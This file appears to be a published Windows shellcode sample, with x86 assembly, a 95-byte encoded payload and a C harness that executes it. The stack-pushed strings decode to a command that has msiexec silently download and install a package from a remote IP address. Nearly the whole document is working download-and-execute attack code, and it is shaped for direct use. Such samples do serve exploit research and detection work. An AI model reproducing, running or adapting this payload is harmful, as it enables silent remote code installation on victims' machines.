/*
# Title: Windows - Download and execute using msiexec.exe
# Author: Kartik Durg
# Shellcode Length: 95 BYTES
# Write-up Link: https://iamroot.blog/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec/
# Tested on: WIN7x86

---------------------------------------------------------------------------------------------------------------------------
==> Assembly code:

xor eax, eax                              ;Get the msvcrt.dll
mov ax, 0x7472                        ;"tr\0\0"
push eax
push dword 0x6376736d         ;"cvsm"
push esp

; LoadLibrary
mov ebx, 0x7717de85             ;Address of function LoadLibraryA (win7)
call ebx
mov ebp, eax                          ;msvcrt.dll is saved in ebp

xor eax, eax                           ;zero out EAX
PUSH eax                              ;NULL at the end of string
PUSH 0x6e712f20                ;"nq/ "
PUSH 0x69736d2e               ;"ism."
PUSH 0x736d2f33                ;"sm/3"
PUSH 0x2e312e38               ;".1.8"
PUSH 0x36312e32               ;"61.2"
PUSH 0x39312f2f                 ;"91//"
PUSH 0x3a707474               ;":ptt"
PUSH 0x6820692f                ;"h i/"
PUSH 0x20636578               ;" cex"
PUSH 0x6569736d               ;"eism"
MOV EDI,ESP                      ;adding a pointer to the stack
PUSH EDI
MOV EAX,0x7587b177        ;calling the system()(win7)
CALL EAX

xor eax, eax
push eax
mov eax, 0x7718be52          ; ExitProcess
call eax

---------------------------------------------------------------------------------------------------------------------------

==> Final shellcode:
*/

char code[] =
"\x31\xc0\x66\xb8\x72\x74\x50\x68\x6d\x73\x76\x63\x54\xbb\x85\xde\x17\x77\xff\xd3\x89\xc5\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\x2e\x6d\x73\x69\x68\x33\x2f\x6d\x73\x68\x38\x2e\x31\x2e\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x89\xe7\x57\xb8\x77\xb1\x87\x75\xff\xd0\x31\xc0\x50\xb8\x52\xbe\x18\x77\xff\xd0";

int main(int argc, char **argv)
{
int (*func)();
func = (int (*)()) code;
(int)(*func)();
}
---------------------------------------------------------------------------------------------------------------------------